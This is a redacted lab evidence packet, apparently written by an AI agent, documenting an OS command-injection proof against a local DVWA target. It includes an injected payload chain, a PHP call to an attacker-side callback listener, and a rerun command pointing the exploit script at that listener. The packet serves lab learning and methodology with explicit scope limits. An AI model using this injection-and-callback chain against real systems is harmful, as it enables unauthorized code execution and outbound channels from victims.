> Public sanitized edition: sensitive personal, target, path, IP, alias, advisory, and run-specific evidence fields are redacted. This repository does not authorize live testing.

# DVWA Attacker Callback Evidence Packet Standardization

Status: completed / standardized from existing verified local-lab artifact
Source: Hermes synthesis of `handoff/dvwa_command_injection_true_attacker_callback_20260522.md` and artifact root
Date: 2026-05-23
Repo truth: `handoff/current_navigation.md`, `handoff/lab_safety_contract.md`, `handoff/dvwa_command_injection_true_attacker_callback_20260522.md`, `modules/bundles/verified_lab_flow_dvwa_command_injection_true_attacker_callback.md`

## Reviewer identity

- Reviewer route/tool: Hermes local control-plane synthesis
- Visible runtime model: `gpt-5.5` / `openai-codex` as exposed by current Hermes session
- Provider / CLI version if visible: provider exposed as `openai-codex`; CLI wrapper version not exposed
- Review focus: evidence quality, route safety, reproducibility, report-readiness, callback truth-labeling
- Limitation: no new exploit rerun was performed because both lab VMs are currently powered off; this packet standardizes the already verified 2026-05-22 artifact and records the next rerun gate.

## Target

- Target name: DVWA command injection disposable lab
- Target URL / service: historical verified run used `http://<lab-ip>:18080`
- Victim route: `<victim-vm>` / `<lab-ip>`
- Attacker/tool route: historical artifact names `<attacker-vm>`; current default route is `<attacker-vm>` / `<lab-ip>`
- Artifact root: `<artifact-output-dir>/dvwa_cmdinj_impact_wave1_20260522T061407Z/`

## Vulnerability class

- Class: OS command injection
- OWASP mapping: injection family; local-lab max-impact proof primitive
- One-vulnerability boundary: one DVWA low-security command injection endpoint, one bounded payload chain
- Why this target demonstrates the class: injected command executed server-side as the web user, wrote/read a lab marker, and initiated a host-only callback to the attacker listener.

## Authorized scope

- Scope basis: local intentionally vulnerable lab
- Public/real target involved: no
- Safety lane: `local-learning-lab`
- Disallowed surfaces avoided: no public target, no persistence, no credential theft, no real exfiltration, no malware, no OS destruction, no automatic report submission.

## Route/tool

- Control plane: Windows Hermes / repo `<private-workspace>`
- Tool/attacker plane: Kali attacker VM; current route should use `<attacker-vm>`
- Victim plane: `<victim-vm>` Docker-published DVWA target
- Network posture: host-only lab network
- NAT status for standardized rerun: must remain closed before target-touching; only temporary setup/pull windows are allowed and must be closed/verified afterward
- Tools/scripts used: `scripts/labs/dvwa_command_injection_impact_wave1.sh`, disposable Docker listener, disposable DVWA container

## Preconditions

- VM/container state at standardization time: read-only VirtualBox check shows both `<attacker-vm>` and `<victim-vm>` are currently powered off.
- Attacker VM posture from read-only check: `<attacker-vm>`, 4096 MB RAM, 4 CPUs, NIC1 host-only on, NIC2 null/off, snapshot `clean-attacker-v2-tools-4096m-4cpu-20260522`.
- Victim VM posture from read-only check: `<victim-vm>`, 4096 MB RAM, 4 CPUs, NIC1 host-only on, NIC2 null/off, snapshot `setup-complete-with-tools`.
- Target service health for historical verified run: pre-login HTTP 200 and post-login HTTP 200.
- Callback/listener setup for historical verified run: Docker-published listener on attacker host-only IP `<lab-ip>:18182`.

## Exploit/probe path

- Discovery path: DVWA low-security command injection training surface.
- Exact trigger path: `/vulnerabilities/exec/` via authenticated DVWA session.
- Payload/command summary: `id; whoami; printf <marker> > /tmp/<marker>.txt; php file_get_contents(<callback_url>, timeout=2); cat /tmp/<marker>.txt`.
- Request caps/timeouts/rate: curl max-time limits in script; PHP callback timeout set to 2 seconds to avoid egress blocker hangs.
- Why this is bounded: marker-only file under `/tmp`, host-only callback, disposable target/listener containers, no persistence/credential theft/destructive OS action.

## Evidence

Primary artifacts:

- Runner summary: `<artifact-output-dir>/dvwa_cmdinj_impact_wave1_20260522T061407Z/summary.md`
- Observations: `<artifact-output-dir>/dvwa_cmdinj_impact_wave1_20260522T061407Z/observations.jsonl`
- Payload: `<artifact-output-dir>/dvwa_cmdinj_impact_wave1_20260522T061407Z/payload/injected_command.txt`
- Command response: `<artifact-output-dir>/dvwa_cmdinj_impact_wave1_20260522T061407Z/http/command_injection_response.html`
- Attacker callback log: `<artifact-output-dir>/dvwa_cmdinj_impact_wave1_20260522T061407Z/attacker_docker_callback/requests.jsonl`

Verified command-execution excerpt:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data
DVWA_CMDINJ_dvwa_cmdinj_impact_wave1_20260522T061407Z
```

Verified callback record:

```json
{"ts":"2026-05-22T06:14:12+00:00","remote":"<lab-ip>","query":"marker=DVWA_CMDINJ_dvwa_cmdinj_impact_wave1_20260522T061407Z","ua":"","path":"/callback.php?marker=DVWA_CMDINJ_dvwa_cmdinj_impact_wave1_20260522T061407Z"}
```

Pre/post health:

- `pre_login_status: 200`
- `post_login_status: 200`

Important evidence caveat:

- The historical `summary.md` and `observations.jsonl` show `callback_count: 0` for the script's old local callback artifact path, but the true attacker-side callback is verified separately under `attacker_docker_callback/requests.jsonl`. The script is now hardened for future reruns with optional `EXTERNAL_CALLBACK_LOG` so summary/observations can count the authoritative Docker/external listener evidence.

## Impact

- Verified impact: server-side OS command execution as `www-data`, marker write/readback under `/tmp`, and outbound host-only callback from victim to attacker listener.
- Maximum safe local-lab impact reached: command execution + marker file + true attacker-side callback.
- Impact not claimed: persistence, privilege escalation, credential theft, database dump, public C2, OS destruction, real target finding.
- Why this matters: this is the baseline callback evidence pattern to reuse for SSRF, XXE, deserialization, and other callback-dependent proof lanes.

## Controls / false-positive boundary

- The callback marker matches the command-execution marker, linking the listener hit to the proof wave.
- The listener remote address is `<lab-ip>`, matching the victim VM route, not the Windows host or scanner loopback.
- Pre/post health shows the disposable target remained reachable during the proof.
- The historical route label should be normalized for future work: use `<attacker-vm>` as current attacker route; keep old labels only as historical artifact metadata.

## Cleanup

Historical verified cleanup recorded:

- Removed victim disposable target container `dvwa-impact-lab`.
- Removed attacker disposable callback listener container `dvwa-attacker-callback`.
- Closed aggressive-lab NAT window: `nic2=null`, `cableconnected2=off`.
- Verified aggressive-lab Internet was unavailable.
- Verified Juice Shop and WebGoat remained available.

Current standardization cleanup / state:

- No new VM, NAT, target, scanner, exploit, callback, or container changes were made during this 2026-05-23 standardization.
- Read-only VirtualBox check confirms both current attacker/victim VMs are powered off and NIC2/NAT is off.

## Rerun commands

Only rerun after starting the local lab VMs and confirming host-only/no-NAT posture from inside the guests.

```bash
# On the attacker VM / project route, using the existing runner and external Docker callback listener:
USE_LOCAL_CALLBACK_LISTENER=0 \
CALLBACK_URL_OVERRIDE="http://<lab-ip>:18182/callback.php?marker=__MARKER__" \
VICTIM_HOST=<lab-ip> \
ATTACKER_HOST=<lab-ip> \
bash scripts/labs/dvwa_command_injection_impact_wave1.sh
```

Rerun gate:

- Confirm `<attacker-vm>` and `<victim-vm>` are the active route.
- Confirm NIC2/NAT is closed after any setup.
- Confirm attacker-to-victim service health.
- Confirm callback listener reachability before claiming callback/control.
- Pull back safe artifacts only.

## Report-readiness

Decision: `reusable_methodology`

Reason: the local-lab proof is strong and reusable as a method, but it is not a real bug bounty finding and must not be promoted to confirmed/reportable outside this lab. For real authorized assessment, scope/rules, rate limits, safe payload policy, program-specific callback permission, redaction, manual verification, and report-readiness gate are still required.

Missing before real bug bounty / pentest use:

- explicit authorized target/program scope;
- written rules allowing command-injection testing and callbacks if applicable;
- safe payload/rate plan;
- redaction and evidence minimization;
- report-readiness review;
- no automatic submission.

## 對專案有什麼幫助

- Establishes the evidence bar for attacker callback proofs: listener log + remote source + unique marker + target command evidence.
- Fixes the navigation ambiguity between historical `<attacker-vm>` artifact labels and the current `<attacker-vm>` route.
- Records the summary/callback-count caveat so future automation does not miss external callback evidence.
- Converts a successful lab wave into a reusable packet shape for SSRF/XXE/deserialization callback lanes.

## 新增/更新了什麼

- Updated script for future reruns: `scripts/labs/dvwa_command_injection_impact_wave1.sh` now accepts optional `EXTERNAL_CALLBACK_LOG` and records `callback_log_kind`/authoritative callback path in observations and summary.
- Updated bundle: `modules/bundles/verified_lab_flow_dvwa_command_injection_true_attacker_callback.md`.
- Updated script inventory: `scripts/SCRIPT_INVENTORY.md`.
- Added reusable template: `templates/one_vuln_evidence_packet_template.md`.
- No new runtime artifacts, VM changes, NAT changes, scanner runs, exploitation, callback listeners, or container operations were performed.
